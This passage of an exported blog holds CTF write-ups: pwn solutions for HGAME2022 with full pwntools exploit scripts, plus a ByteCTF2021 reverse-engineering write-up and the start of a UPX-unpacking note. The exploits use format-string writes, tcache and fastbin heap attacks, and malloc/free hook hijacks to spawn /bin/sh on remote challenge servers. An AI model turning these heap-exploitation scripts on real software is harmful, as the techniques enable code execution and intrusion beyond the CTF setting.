51693)sh.recvuntil(') == ')hash_code = sh.recvuntil('\\n', drop=True).decode().strip()log.success('hash_code={},'.format(hash_code))charset = string.printableproof = mbruteforce(lambda x: hashlib.sha256((x).encode()).hexdigest() == hash_code, charset, 4, method='fixed')sh.sendafter('????&gt; ', proof)sh.recvuntil(&quot;write: &quot;)write_addr = int(sh.recvuntil(&quot;\\n&quot;),16)log.success(hex(write_addr))libc = LibcSearcher(&quot;write&quot;,write_addr)lbase = write_addr - libc.dump(&quot;write&quot;)libc_start_main = lbase+libc.dump(&quot;__libc_start_main&quot;)log.success(hex(libc_start_main))sh.recvuntil(&quot;&gt;&gt; &quot;)sh.send(&quot;/proc/self/mem&quot;)shellcode = &quot;\\x90&quot;*0x2fd0+asm(shellcraft.sh()) #添加 slide code 增加执行 shellcode 的概率sh.recvuntil(&quot;&gt;&gt; &quot;)sh.send(str(libc_start_main)) #执行完会返回到 libc_start_mainsh.recvuntil(&quot;&gt;&gt; &quot;)sh.sendline(shellcode)sh.interactive() echo_sever ​ 堆上的格式化字符串 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889from pwn import *from pwnlib.util.iters import mbruteforce#context.log_level='debug'#r = process('./echo')r = remote(&quot;chuj.top&quot;,52061)libc = ELF('./libc-2.31.so')f = ELF('./echo')def proof_of_work(): r.recvuntil(') == ') hash_code = r.recvuntil('\\n', drop=True).decode().strip() log.success('hash_code={},'.format(hash_code)) charset = string.printable proof = mbruteforce(lambda x: hashlib.sha256((x).encode()).hexdigest() == hash_code, charset, 4, method='fixed') r.sendafter('????&gt; ', proof)proof_of_work()r.recvuntil(&quot;&gt;&gt; &quot;)r.sendline('100')payload = &quot;%6$p-%13$p&quot;r.sendline(payload)rbp = int(r.recvuntil(&quot;-&quot;).strip('-'),16)leak_addr = int(r.recvuntil('\\n'),16)-243log.success(hex(leak_addr))lbase = leak_addr - libc.symbols[&quot;__libc_start_main&quot;]log.success(&quot;libc_base:&quot;+hex(lbase))free_hook = lbase+libc.symbols[&quot;__free_hook&quot;]log.success(&quot;libc_free_hook:&quot;+hex(free_hook))system_addr = lbase+libc.symbols[&quot;system&quot;]log.success(&quot;system_addr:&quot;+hex(system_addr))r.recvuntil(&quot;&gt;&gt; &quot;)r.sendline('100')payload = &quot;%&quot;+str((rbp+0x18+2)&amp;0xffff)+&quot;c&quot;+&quot;%6$hn&quot;r.sendline(payload)r.recvuntil(&quot;&gt;&gt; &quot;)r.sendline('100')payload = &quot;%&quot;+str((free_hook&gt;&gt;16)&amp;0xffff)+'c'+&quot;%10$hn&quot;r.sendline(payload)r.recvuntil(&quot;&gt;&gt; &quot;)r.sendline('100')payload = &quot;%&quot;+str((rbp+0x18)&amp;0xffff)+&quot;c&quot;+&quot;%6$hn&quot;r.sendline(payload)r.recvuntil(&quot;&gt;&gt; &quot;)r.sendline('100')payload = &quot;%&quot;+str((free_hook+4)&amp;0xffff)+'c'+&quot;%10$hn&quot;r.sendline(payload)r.recvuntil(&quot;&gt;&gt; &quot;)r.sendline('100')payload = &quot;%&quot;+str((system_addr&gt;&gt;32)&amp;0xffff)+'c'+&quot;%13$hn&quot;r.sendline(payload)r.recvuntil(&quot;&gt;&gt; &quot;)r.sendline('100')payload = &quot;%&quot;+str((free_hook+2)&amp;0xffff)+'c'+&quot;%10$hn&quot;r.sendline(payload)r.recvuntil(&quot;&gt;&gt; &quot;)r.sendline('100')payload = &quot;%&quot;+str((system_addr&gt;&gt;16)&amp;0xffff)+'c'+&quot;%13$hn&quot;r.sendline(payload)r.recvuntil(&quot;&gt;&gt; &quot;)r.sendline('100')payload = &quot;%&quot;+str((free_hook)&amp;0xffff)+'c'+&quot;%10$hn&quot;r.sendline(payload)r.recvuntil(&quot;&gt;&gt; &quot;)r.sendline('100')payload = &quot;%&quot;+str((system_addr)&amp;0xffff)+'c'+&quot;%13$hn&quot;r.sendline(payload)r.recvuntil(&quot;&gt;&gt; &quot;)r.sendline('100')r.sendline(&quot;/bin/sh\\x00&quot;)r.recvuntil(&quot;&gt;&gt; &quot;)r.sendline('0')r.interactive() oldfashion_note 思路 程序有add，delete，show这几个功能，delete 函数中未将指针置零，存在 UAF 漏洞 首先要利用 show 功能 leak 出 libc 基址，此处用到 Unsorted Bin Leak（首先要填满 tcache 才能通过 free 进入 unsorted bin） 获得 libc 基址后考虑劫持钩子函数 __free_hook 为 system，因为题目使用的库版本是 libc-2.31.so 所以 tcache 的 double free 会有检测（libc2.29以上的版本），可通过 stash 绕过 tcache相关 当所请求的分配大小不大于0x408并且当给定大小的 tcache bin 未满时调用 tcache_put。一个 tcache bin 中的最大块数mp_.tcache_count是7 123456typedef struct tcache_entry{ struct tcache_entry *next; /* This field exists to detect double frees. */ struct tcache_perthread_struct *key; //新增的check字段} tcache_entry; 123456789101112131415161718192021222324_int_free (mstate av, mchunkptr p, int have_lock){ size_t tc_idx = csize2tidx (size); /* Check to see if it's already in the tcache. */ tcache_entry *e = (tcache_entry *) chunk2mem (p); /* This test succeeds on double free. However, we don't 100% trust it (it also matches random payload data at a 1 in 2^&lt;size_t&gt; chance), so verify it's not an unlikely coincidence before aborting. */ if (__glibc_unlikely (e-&gt;key == tcache &amp;&amp; tcache)) //check { tcache_entry *tmp; LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx); for (tmp = tcache-&gt;entries[tc_idx]; tmp; tmp = tmp-&gt;next) if (tmp == e) malloc_printerr (&quot;free(): double free detected in tcache 2&quot;); /* If we get here, it was a coincidence. We've wasted a few cycles, but don't abort. */ }...... double free 会将 key 字段置为 tcache，无法通过上面的检测 为了绕过这一检测大致有两种方法： 修改 key 字段 tcache stashing unlink attack 如果程序有 edit 功能的话就可以修改 key 字段来绕过检测，但本题没有提供所以考虑 tcache stashing unlink attack 这种攻击利用的是 tcache bin 有剩余 (数量小于 TCACHE_MAX_BINS ) 时，同大小的 small bin 或 fast bin 会放进 tcache 中，在获取到一个 small bin/fast bin 中的一个 chunk 后如果 tcache 仍有足够空闲位置，会将剩余的 small bin/fast bin 链入 tcache ，在这个过程中只对第一个 bin 进行了完整性检查，后面的堆块的检查缺失。当攻击者可以写一个 small bin 的 bk 指针 或 fast bin 的 fd 指针时，其可以在任意地址上写一个 libc 地址 先将相同大小的 tcache 清空，以便分配到 fast bin 的堆块 分配 fast bin 中的堆块，剩下的部分链入 tcache Unsorted bin leak ​ unsorted bin 结构如下，是循环双向链表 ​ 可以看出 show bin2 中的内容就可以获得 main_arena 内的一个地址（要防止与 top chunk 合并），而 main_arena 与 __malloc_hook 固定差 0x10 从而计算得到 libc 基址 fast bin attack ​ 之后重新分配堆块得到 chunk1 ，将其 fd 指针置为 fake chunk 就可以实现任意写 exp 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677# coding=utf-8from pwn import *from pwnlib.util.iters import mbruteforce#context.log_level = 'debug'#r = process('./note')r=remote(&quot;chuj.top&quot;,51475)libc = ELF('./libc-2.31.so')def proof_of_work(): r.recvuntil(') == ') hash_code = r.recvuntil('\\n', drop=True).decode().strip() log.success('hash_code={},'.format(hash_code)) charset = string.printable proof = mbruteforce(lambda x: hashlib.sha256((x).encode()).hexdigest() == hash_code, charset, 4, method='fixed') r.sendafter('????&gt; ', proof)def add(idx,size,content): r.sendlineafter(&quot;&gt;&gt; &quot;,&quot;1&quot;) r.sendlineafter(&quot;&gt;&gt; &quot;,str(idx)) r.sendlineafter(&quot;&gt;&gt; &quot;,str(size)) r.sendafter(&quot;&gt;&gt; &quot;,content)def show(idx): r.sendlineafter(&quot;&gt;&gt; &quot;,&quot;2&quot;) r.sendafter(&quot;&gt;&gt; &quot;,str(idx))def delete(idx): r.sendlineafter(&quot;&gt;&gt; &quot;,&quot;3&quot;) r.sendafter(&quot;&gt;&gt; &quot;,str(idx))proof_of_work()#unsorted bin leakfor i in range(8): #填满tcache 7 size相同 add(i, 0x80, 'a')for i in range(7): delete(i)add(10,0x10,'protected') #防止合并进top chunkdelete(7)show(7)malloc_hook = u64(r.recv(6).ljust(8,'\\x00'))-96-0x10log.success(hex(malloc_hook))lbase = malloc_hook - libc.symbols[&quot;__malloc_hook&quot;]log.success(hex(lbase))free_hook = lbase+libc.symbols[&quot;__free_hook&quot;]system_addr = lbase+libc.symbols[&quot;system&quot;]#tcache stashing for i in range(9): #填满tcache 7 size相同 add(i, 0x20, 'a')for i in range(7): delete(i)delete(7) #fast bindelete(8)delete(7)#gdb.attach(r)for i in range(7): #清空 tcache add(i, 0x20, 'a')add(10, 0x20 , p64(free_hook))add(11,0x20,'a')add(11,0x20,'a')add(12,0x20,p64(system_addr))add(0,0x20,&quot;/bin/sh\\x00&quot;)delete(0)r.interactive() week3 changeable_note 思路 ​ 存在堆溢出，可以伪造 chunk 实现 unlink，让 notes[1] = &amp;notes[1]-0x18，劫持 free 为 puts 从而获得 libc 基址，最后再劫持 atoi 为 system 拿到 shell chunk1 -&gt; 0 0x31 fake chunk -&gt; 0 0x21 fake fd -&gt; &amp;notes[1]-0x18 fake bk -&gt; &amp;notes[1]-0x10 size检查 0x20 … chunk2 -&gt; 0x30 prev_inuse 为 0，前一个chunk为 free 状态 0x90 exp 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162# coding: utf-8from pwn import *from pwnlib.util.iters import mbruteforcecontext.log_level='debug'#r = process('./note')r=remote(&quot;chuj.top&quot;,52548)f = ELF('./note')libc = ELF('./libc-2.23.so')def proof_of_work(): r.recvuntil(') == ') hash_code = r.recvuntil('\\n', drop=True).decode().strip() log.success('hash_code={},'.format(hash_code)) charset = string.printable proof = mbruteforce(lambda x: hashlib.sha256((x).encode()).hexdigest() == hash_code, charset, 4, method='fixed') r.sendafter('????&gt; ', proof)def add(idx,size,content): r.sendafter(&quot;&gt;&gt; &quot;,&quot;1&quot;) r.sendafter(&quot;&gt;&gt; &quot;,str(idx)) r.sendafter(&quot;&gt;&gt; &quot;,str(size)) r.sendafter(&quot;&gt;&gt; &quot;,content)def delete(idx): r.sendafter(&quot;&gt;&gt; &quot;,&quot;3&quot;) r.sendafter(&quot;&gt;&gt; &quot;,str(idx))def edit(idx,content): r.sendafter(&quot;&gt;&gt; &quot;,&quot;2&quot;) r.sendafter(&quot;&gt;&gt; &quot;,str(idx)) r.sendline(content)proof_of_work()# unlinkadd(0,0x30,'a')add(1,0x30,'a')add(2,0x80,'a')add(3,0x30,'a')ptr0 = 0x4040C0payload = p64(0)+p64(0x21)+p64(ptr0+8-0x18)+p64(ptr0+8-0x10)+p64(0x20)payload = payload.ljust(0x30,'a')payload += p64(0x30)+p64(0x90)edit(1,payload)delete(2)payload = 'a'*16+p64(f.got[&quot;free&quot;])+p64(f.got[&quot;puts&quot;])+p64(0)+p64(f.got[&quot;atoi&quot;])edit(1,payload)#gdb.attach(r)edit(0,p64(f.plt[&quot;puts&quot;])[0:7]) #8个字节会覆盖下个函数delete(1)leak_addr = u64(r.recv(6).ljust(8,'\\x00'))lbase = leak_addr-libc.symbols[&quot;puts&quot;]log.success(hex(lbase))edit(3,p64(lbase+libc.symbols[&quot;system&quot;]))r.sendafter(&quot;&gt;&gt; &quot;,&quot;/bin/sh\\x00&quot;)r.interactive() elder_note 思路 ​ https://xz.aliyun.com/t/7490 ​ 通过 show 功能实现 unsorted bin leak ，delete 中指针未置为0，存在 UAF，可以采用 fastbin attack ​ fastbin 存在 size 检查，可以利用字节错位绕过 size 域的检测，一般是在 __malloc_hook 附近伪造 chunk （Arbitrary Alloc） 1234567891011121314151617pwndbg&gt; p &amp;__malloc_hook $1 = (void *(**)(size_t, const void *)) 0x7f40310f6b10 &lt;__malloc_hook&gt; pwndbg&gt; find_fake_fast 0x7f40310f6b10 0x7fFAKE CHUNKSFake chunk | Allocated chunk | PREV_INUSE | IS_MMAPED | NON_MAIN_ARENAAddr: 0x7f40310f6aedprev_size: 0x40310f5260000000size: 0x7ffd: 0x4030db7ea0000000bk: 0x4030db7a7000007ffd_nextsize: 0x7fbk_nextsize: 0x00pwndbg&gt; p /x 0x7f40310f6b10-0x7f40310f6aed$2 = 0x23 ​ 本来之后劫持 __malloc_hook 为 one_gadget 就可以 get shell，但是这里的 one_gadget 都不满足条件，所以要通过 __realloc_hook 来调整栈帧，劫持 __realloc_hook 为 one_gadget ​ realloc 函数开头的 push 和 sub rsp,18h 可以调整栈来满足 one_gadget 的使用条件 ​ __realloc_hook 和 __malloc_hook 邻近，可以一次性劫持 exp 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273# coding: utf-8from pwn import *from pwnlib.util.iters import mbruteforcecontext.log_level='debug'#r = process('./note2')r=remote(&quot;chuj.top&quot;,52617)f = ELF('./note2')libc = ELF('./libc-2.23.so')def proof_of_work(): r.recvuntil(') == ') hash_code = r.recvuntil('\\n', drop=True).decode().strip() log.success('hash_code={},'.format(hash_code)) charset = string.printable proof = mbruteforce(lambda x: hashlib.sha256((x).encode()).hexdigest() == hash_code, charset, 4, method='fixed') r.sendafter('????&gt; ', proof)def add(idx,size,content): r.sendafter(&quot;&gt;&gt; &quot;,&quot;1&quot;) r.sendafter(&quot;&gt;&gt; &quot;,str(idx)) r.sendafter(&quot;&gt;&gt; &quot;,str(size)) r.sendafter(&quot;&gt;&gt; &quot;,content)def delete(idx): r.sendafter(&quot;&gt;&gt; &quot;,&quot;3&quot;) r.sendafter(&quot;&gt;&gt; &quot;,str(idx))def show(idx): r.sendlineafter(&quot;&gt;&gt; &quot;,&quot;2&quot;) r.sendafter(&quot;&gt;&gt; &quot;,str(idx))proof_of_work()#unsorted bin leakadd(0,0x80,'a')add(1,0x10,'a')delete(0)show(0)malloc_hook = u64(r.recv(6).ljust(8,'\\x00'))-88-0x10lbase = malloc_hook-libc.symbols[&quot;__malloc_hook&quot;]log.success(hex(lbase))#system_addr = lbase+libc.symbols[&quot;system&quot;]one_gadget = lbase+0x4527arealloc_hook = lbase + libc.symbols['realloc']log.info(&quot;reallock_hook:&quot;+hex(realloc_hook))log.info(&quot;ongadget:&quot;+hex(one_gadget))#fastbin attackadd(2,0x60,'a')add(3,0x60,'a')delete(2)delete(3)delete(2)fake_chunk_addr = malloc_hook-0x23add(2,0x60,p64(fake_chunk_addr))add(3,0x60,'a')add(4,0x60,'a')payload = &quot;a&quot;*(0x13-8)+p64(one_gadget)+p64(realloc_hook+0x10) #realloc调栈帧add(5,0x60,payload)#gdb.attach(r)r.sendafter(&quot;&gt;&gt; &quot;,&quot;1&quot;)r.sendafter(&quot;&gt;&gt; &quot;,&quot;6&quot;)r.sendafter(&quot;&gt;&gt; &quot;,str(20))r.interactive() sized_note 思路 ​ add 和 edit 都存在 off-by-null，通过利用可以造成 chunk overlapping ，进而 leak libc 和改写 tcache 的 next 指针 ​ https://blog.csdn.net/qq_43409582/article/details/109825038 chunk overlapping https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/chunk-extend-overlapping/#4extendoverlapping 通过 extend 前向 overlapping：改写 chunk 的 prev_size 域和 prev_inuse 域合并堆块，利用了unlink 机制，可以跨越多个堆块进行合并 通过 extend 后向 overlapping：改写 size 域实现 overlapping exp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475# coding: utf-8from pwn import *from pwnlib.util.iters import mbruteforce#context.log_level='debug'#r = process('./note3')r=remote(&quot;chuj.top&quot;,52863)f = ELF('./note3')libc = ELF('./libc.so.6')def proof_of_work(): r.recvuntil(') == ') hash_code = r.recvuntil('\\n', drop=True).decode().strip() log.success('hash_code={},'.format(hash_code)) charset = string.printable proof = mbruteforce(lambda x: hashlib.sha256((x).encode()).hexdigest() == hash_code, charset, 4, method='fixed') r.sendafter('????&gt; ', proof)def add(idx,size,content): r.sendafter(&quot;&gt;&gt; &quot;,&quot;1&quot;) r.sendafter(&quot;&gt;&gt; &quot;,str(idx)) r.sendafter(&quot;&gt;&gt; &quot;,str(size)) r.sendafter(&quot;&gt;&gt; &quot;,content)def show(idx): r.sendlineafter(&quot;&gt;&gt; &quot;,&quot;2&quot;) r.sendafter(&quot;&gt;&gt; &quot;,str(idx))def delete(idx): r.sendafter(&quot;&gt;&gt; &quot;,&quot;3&quot;) r.sendafter(&quot;&gt;&gt; &quot;,str(idx))def edit(idx,content): r.sendafter(&quot;&gt;&gt; &quot;,&quot;4&quot;) r.sendafter(&quot;&gt;&gt; &quot;,str(idx)) r.send(content)proof_of_work()for i in range(10): add(i, 0xf8, 'a')for i in range(7): #填满tcache 7 size相同 delete(i)add(10,0x20,&quot;protect&quot;) #防止合并delete(7) #unsorted bin chunk0edit(8,&quot;a&quot;*0xf0+p64(0x100*2)) #chunk overlapping chunk1delete(9) #chunk2for i in range(7): #清空tcache add(i, 0xf8, 'a')add(10, 0xf8,&quot;a&quot;) #chunk0show(8) #chunk1malloc_hook = u64(r.recv(6).ljust(8,'\\x00'))-96-0x10lbase = malloc_hook-libc.symbols['__malloc_hook']system_addr = lbase+libc.symbols['system']free_hook = lbase+libc.symbols['__free_hook']log.success(hex(lbase))#tcache poisoningadd(11, 0xf8,'a') #chunk1delete(11)edit(8,p64(free_hook)) #uafadd(12, 0xf8, 'a')add(13,0xf8,p64(system_addr))#gdb.attach(r)add(14,0xf8,&quot;/bin/sh\\x00&quot;)delete(14)r.interactive() week4 vector 思路 ​ libc 版本 2.31 ​ move_note 函数中存在 vector 迭代器失效的漏洞，vector 的 resize 操作会改变容器容量，进行扩容时会重新分配内存，那么指向容器的迭代器、指针和引用都会失效，而下面移动的操作会使用已经失效的迭代器，存在 UAF ​ 通过调试可以发现在 move_note 扩容后可以把失效迭代器中的值复制到要 move 到的地方，这样就可以实现 double free，为了绕过 key 检测还是使用 tcache stashing 1234567891011121314# tcache stashingdelete(3)delete(15)delete(20)for i in range(5, 12): add(i, 0x70, 'a')add(3,0x70,p64(free_hook))add(12,0x70,&quot;a&quot;)add(13,0x70,&quot;a&quot;)add(14,0x70,&quot;/bin/sh\\x00&quot;)add(15,0x70,p64(system_addr))delete(14) ​ 为了 leak libc 基址要先 malloc 一个较大的堆块，然后 free 进入 unsorted bin 。这时再申请一个较小的堆块，那么 unsorted bin 就会被切割，切割出来的块内有指向 main_arena 内部的指针，就可以得到 libc 基址 ​ https://10-0-0-55.github.io/pwn/unsorted-bin/#leak-heap-libc 12345678910for i in range(9): add(i, 0xf0, 'a')for i in range(7): #填满tcache 7 size相同 delete(i)delete(7) #得到 unsorted binadd(7,0x50,'aaaaaaaa') #切割 unsorted binshow(7) exp 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283# coding: utf-8from pwn import *from pwnlib.util.iters import mbruteforcecontext.log_level='debug'#r = process('./vector')r=remote(&quot;chuj.top&quot;,53088)f = ELF('./vector')libc = ELF('./libc.so.6')def proof_of_work(): r.recvuntil(') == ') hash_code = r.recvuntil('\\n', drop=True).decode().strip() log.success('hash_code={},'.format(hash_code)) charset = string.printable proof = mbruteforce(lambda x: hashlib.sha256((x).encode()).hexdigest() == hash_code, charset, 4, method='fixed') r.sendafter('????&gt; ', proof)def add(idx,size,content): r.sendafter(&quot;&gt;&gt; &quot;,&quot;1&quot;) r.sendafter(&quot;&gt;&gt; &quot;,str(idx)) r.sendafter(&quot;&gt;&gt; &quot;,str(size)) r.sendafter(&quot;&gt;&gt; &quot;,content)def show(idx): r.sendlineafter(&quot;&gt;&gt; &quot;,&quot;3&quot;) r.sendafter(&quot;&gt;&gt; &quot;,str(idx))def delete(idx): r.sendafter(&quot;&gt;&gt; &quot;,&quot;4&quot;) r.sendafter(&quot;&gt;&gt; &quot;,str(idx))def move(idx): r.sendafter(&quot;&gt;&gt; &quot;,&quot;5&quot;) r.sendafter(&quot;&gt;&gt; &quot;,'0') r.sendafter(&quot;&gt;&gt; &quot;,'0') r.sendafter(&quot;&gt;&gt; &quot;,'1') r.sendafter(&quot;&gt;&gt; &quot;,str(idx))proof_of_work()for i in range(9): add(i, 0xf0, 'a')for i in range(7): #填满tcache 7 size相同 delete(i)delete(7) #得到 unsorted binadd(7,0x50,'aaaaaaaa') #切割 unsorted binshow(7)r.recv(8)malloc_hook = u64(r.recv(6).ljust(8,'\\x00')) - 336-0x10lbase = malloc_hook-libc.symbols[&quot;__malloc_hook&quot;]free_hook = lbase+libc.symbols[&quot;__free_hook&quot;]system_addr = lbase+libc.symbols[&quot;system&quot;]log.success(hex(lbase))for i in range(1, 14): add(i, 0x70, 'a')move(20) #UAFadd(15,0x70,'a')for i in range(4,13): delete(i)# tcache stashingdelete(3)delete(15)delete(20)for i in range(5, 12): add(i, 0x70, 'a')add(3,0x70,p64(free_hook))add(12,0x70,&quot;a&quot;)add(13,0x70,&quot;a&quot;)add(14,0x70,&quot;/bin/sh\\x00&quot;)add(15,0x70,p64(system_addr))delete(14)r.interactive() Final pwn1 思路 add 里面没有限制申请堆块的大小，delete 和 view 里面 index 可以是负的 可以先利用 unsorted bin 泄露 libc 和 heap 基址 note 通过 mmap 分配，如果申请一个较大的堆块，根据内存排布可以知道新分配的较大的堆块会在 note 的附近 这样就可以在申请较大堆块的时候写入堆地址，和负数下标的漏洞一起可以导致 double free libc 版本为 2.31，之后的利用就是 tcache stashing 那一套 exp 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374#coding=utf-8from pwn import *#context.log_level='debug'context.terminal = ['tmux','splitw','-h']#r = process(&quot;pwn1&quot;)r = remote(&quot;chuj.top&quot;,20000)f = ELF(&quot;./pwn1&quot;)libc = ELF(&quot;libc-2.31.so&quot;)def create(size,content): r.recvuntil(&quot;&gt;&gt; &quot;) r.send('1') r.sendlineafter(&quot;size: &quot;,str(size)) r.sendafter(&quot;content: &quot;,content)def view(idx): r.sendlineafter(&quot;&gt;&gt; &quot;,'3') r.sendlineafter(&quot;index: &quot;,str(idx))def delete(idx): r.sendlineafter(&quot;&gt;&gt; &quot;,'2') r.sendlineafter(&quot;index: &quot;,str(idx))for i in range(0,11): create(0x80,str(i))for i in range(0,8): delete(i)delete(9)for i in range(0,7): create(0x80,str(i))create(0x40,'a'*8)view(7)r.recvuntil(&quot;content: aaaaaaaa&quot;)heapbase = u64(r.recv(6).ljust(8,'\\x00'))-0x7a0log.success(&quot;heap base: &quot;+hex(heapbase))create(0x40,'a'*8)view(9)r.recvuntil(&quot;content: aaaaaaaa&quot;)lbase = u64(r.recv(6).ljust(8,'\\x00'))-0x1ebc60free_hook = lbase + libc.sym[&quot;__free_hook&quot;]system_addr = lbase+libc.sym[&quot;system&quot;]log.success(&quot;libc base: &quot;+hex(lbase))create(0x30,'to be fastbin') #fastbin double free 11create(0x21000,'a'*0x20ff0+p64(heapbase+0x6e0))for i in range(0,8): create(0x30,'a')for i in range(13,20): delete(i)delete(11)delete(20)delete(-512)for i in range(0,7): #tcache 先于 fasbin 被分配 create(0x30,str(i))create(0x30,p64(free_hook))create(0x30,'/bin/sh\\x00')create(0x30,'/bin/sh\\x00')#gdb.attach(proc.pidof(r)[0])create(0x30,p64(system_addr))delete(20)r.interactive()","link":"/2022/02/18/HGAME2022-Pwn-wp/"},{"title":"ByteCTF2021决赛re writeup","text":"ByteCTF 中部分逆向题的wp BabyHeaven ​ 这下面是队友做的部分和写的 wp ⬇ ​ 使用以下代码加载所给文件： 1234auto mem = VirtualAlloc(NULL, 0x4000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);FILE* fp = fopen(&quot;BabyHeaven&quot;, &quot;rb&quot;);fread(mem, 1, 0x3476, fp);((void (*)())mem)(); ​ 调试可得程序使用VirtualAlloc函数分配了一段可执行的空间，并写入了自己的汇编代码来执行，直接将其中的二进制数字用正则表达式筛选出来，需要注意的是其中顺序有颠倒，写成二进制文件，构造函数，即可得到如下算法： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384memset(v4, 0, 220);v4[0] = 5;v4[1] = 18;v4[2] = 14;v4[3] = 23;v4[4] = 9;v4[5] = 15;v4[6] = 4;v4[7] = 21;v4[8] = 10;v4[9] = 20;v4[10] = 19;v4[11] = 25;v4[12] = 24;v4[13] = 22;v4[14] = 12;v4[15] = 16;v4[16] = 2;v4[17] = 17;v4[18] = 7;v4[19] = 1;v4[20] = 8;v4[21] = 11;v4[22] = 6;v4[23] = 13;v4[24] = 3;memset(v3, 0, 220);v3[0] = 5;v3[1] = 18;v3[2] = 14;v3[3] = 23;v3[4] = 11;v3[5] = 17;v3[6] = 12;v3[7] = 4;v3[8] = 25;v3[9] = 24;v3[10] = 1;v3[11] = 20;v3[12] = 19;v3[13] = 15;v3[14] = 13;v3[15] = 10;v3[16] = 6;v3[17] = 21;v3[18] = 7;v3[19] = 22;v3[20] = 8;v3[21] = 3;v3[22] = 9;v3[23] = 2;v3[24] = 16;v5 = 25;*a1 = 0i64;do{ ++*a1; result = (unsigned int)(v5 - 1); for ( i = v5 - 1; i &gt; 0; --i ) { result = (unsigned int)v4[i - 1]; if ( v4[i] &gt; (int)result ) break; } if ( i &lt;= 0 ) break; for ( j = v5 - 1; j &gt;= i &amp;&amp; v4[j] &lt;= v4[i - 1]; --j ) ; v2 = i - 1; v4[i - 1] ^= v4[j]; v4[j] ^= v4[v2]; v4[i - 1] ^= v4[j]; for ( j = v5 - 1; i &lt; j; --j ) { v4[i] ^= v4[j]; v4[j] ^= v4[i]; v4[i++] ^= v4[j]; } for ( i = 0; i &lt; v5 &amp;&amp; v4[i] == v3[i]; ++i ) ; result = (unsigned int)i;}while ( i &lt; v5 );return result; ​ 并通过所给文件的最后几行 ​ 推测是上述算法的运行次数转ASCII就是flag ​ 求运行次数这部分是我写的脚本⬇ ​ 通过找每一次执行的输出结果的规律，得到计算执行次数的方法 ​ ​ 这一段可以看出要从序列末尾 11 3 6 8 13 变为 13 3 6 8 11 需要执行的次数是 4!，即一个数变成后面序列中比它稍大的数（只大一个），并且后面的序列为升序的次数是后面序列数字个数的阶乘 ​ 那就可以算出从 5, 18, 14, 23, 9, 1, 2, 3, 4, 6, 7, 8, 10, 11, 12, 13, 15, 16, 17, 19, 20, 21, 22, 24, 25 变化到 5, 18, 14, 23, 11, 1, 2, 3, 4, 6, 7, 8, 9, 10, 12, 13, 15, 16, 17, 19, 20, 21, 22, 24, 25 的次数是 2*20! ​ 之后减去和增加剩余的部分就可以得到最终执行的次数 1234567891011121314151617181920212223242526272829import mathdst = [5, 18, 14, 23, 9, 15, 4, 21, 10, 20, 19, 25, 24, 22, 12, 16, 2, 17, 7, 1, 8, 11, 6, 13, 3]src = [5, 18, 14, 23, 9, 1, 2, 3, 4, 6, 7, 8, 10, 11, 12, 13, 15, 16, 17, 19, 20, 21, 22, 24, 25]dst2 = [5, 18, 14, 23, 11, 17, 12, 4, 25, 24, 1, 20, 19, 15, 13, 10, 6, 21, 7, 22, 8, 3, 9, 2, 16]src2 = [5, 18, 14, 23, 11, 1, 2, 3, 4, 6, 7, 8, 9, 10, 12, 13, 15, 16, 17, 19, 20, 21, 22, 24, 25]result = 2*math.factorial(20)ans = 0factor = 19for i in range(5,len(src)): ans+=(src.index(dst[i])-i)*math.factorial(factor) factor-=1 for j in range(src.index(dst[i]),i,-1): src[j]=src[j-1] src[i]=dst[i]ans2 = 0factor = 19for i in range(5,len(src2)): ans2+=(src2.index(dst2[i])-i)*math.factorial(factor) factor-=1 for j in range(src2.index(dst2[i]),i,-1): src2[j]=src2[j-1] src2[i]=dst2[i]print(hex(result - ans + ans2))#'Qw021zbG' ByteService（未完成） ​ 这题并没有做出来，还差最后的 java 逆向，这里先记录一下已有的进度，然后就等官方 wp 了 ​ 首先看 apk 反编译结果发现是实现了一个进程通信，反编译出来的是客户端代码，而服务端是在题目描述里下载得到的sdk ​ Android Studio 下一个版本对应的 sdk，用从 xml 下载得到的 zip 替换已有 sdk 目录下的system-images 里的文件，开模拟器打开 apk 测试可以得到 ​ 输入是16个字符的时候能够得到最底下显示的内容（apk实际上没有调用 checkCTFService 函数） ​ adb shell service list可以查看开的系统服务，这里可以看到自定义了一个服务 ​ 查资料可以知道 /system/framework 目录下存的是 sdk 核心文件，services.jar 里是系统服务的代码。找到 com.android.server.os.ByteCTFService 可以看到 flag 的验证部分，而com.bytedance.bytectf.A 和 android.os.IByteCTFService 这两个类在 framework.jar 里面 ​ 之后就是逆向的过程，使用了 java 的 lambda 函数，然后那一堆函数就看不懂了 参考资料 Android进程间通信（一）：使用Parcel对象完成进程间通信 android系统服务的查找","link":"/2021/12/13/ByteCTF2021%E5%86%B3%E8%B5%9Bre-writeup/"},{"title":"UPX 壳反解压技术","text":"TSGCTF optimized 中用到的 UPX 壳的反解压 判断是否加壳 不标准的段名，静态链接 找不到输出字符串 entry point 在其他地方 一些通过 upx 压缩的文件可能不会被识别为 upx 压缩过的，基本上是通过更改文件头中的一些数据实现的（可根据 upx -d 的报错判断） upx 文件头结构 12345678910111213141516171819202122232425262728293031struct b_info // 12-byte header before each compressed block{ uint32_t sz_unc; // uncompressed_sizeuint32_t sz_cpr; // compressed_sizeunsigned char b_method; // compression algorithmunsigned char b_ftid; // filter idunsigned char b_cto8; // filter parameterunsigned char b_unused; // unused}; struct l_info // 12-byte trailer in header for loader (offset 116){ uint32_t l_checksum; // checksumuint32_t l_magic; // UPX! magic [55 50 58 21]uint16_t l_lsize; // loader sizeuint8_t l_version; // version infouint8_t l_format; // UPX format }; struct p_info // 12-byte packed program header follows stub loader{ uint32_t p_progid; // program header id [00 00 00 00]uint32_t p_filesize; // filesize [same as blocksize]uint32_t p_blocksize; // blocksize [same as filesize] }; 现在主要伪造的是 p_info ,l_info 里的内容，在b_info 